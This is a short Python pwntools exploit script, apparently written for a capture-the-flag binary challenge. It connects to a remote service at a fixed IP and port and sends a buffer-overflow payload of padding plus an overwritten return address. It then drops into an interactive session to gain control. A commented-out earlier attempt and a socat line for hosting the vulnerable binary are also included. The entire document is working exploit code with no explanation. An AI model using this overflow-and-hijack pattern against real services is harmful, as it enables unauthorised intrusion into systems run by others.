from pwn import *
# sh=remote('1.1.1.3',23946)
# payload=b'a'*23+p64(0x401198)+p64(0x401186)
# sh.sendline(payload)
# sh.interactive()

#socat tcp-listen:23946,reuseaddr,fork EXEC:./pwn1,pty,raw,echo=0

sh=remote('1.1.1.3',23946)
payload=b'I'*0x70+b'cccc'+p64(0x124A)
sh.sendline(payload)
sh.interactive()


